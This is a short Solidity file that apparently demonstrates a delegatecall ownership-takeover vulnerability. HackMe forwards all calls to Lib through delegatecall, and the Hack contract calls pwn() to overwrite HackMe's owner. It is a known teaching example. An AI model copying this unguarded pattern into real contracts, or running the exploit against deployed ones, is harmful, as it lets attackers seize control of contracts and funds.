//SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

contract HackMe {
    address public owner;
    Lib public lib;

    constructor (Lib _lib) public {
        owner = msg.sender;
        lib = Lib(_lib);
    }

    fallback() external payable {
        address(lib).delegatecall(msg.data);
    }
}

contract Lib {
    address public owner;

    function pwn() public {
        owner = msg.sender;
    } 
}

contract Hack {
    address addr;
    constructor (address _addr) public {
        addr = _addr;
    }

    function attack() public {
        addr.call(abi.encodeWithSignature("pwn()"));
    }
}
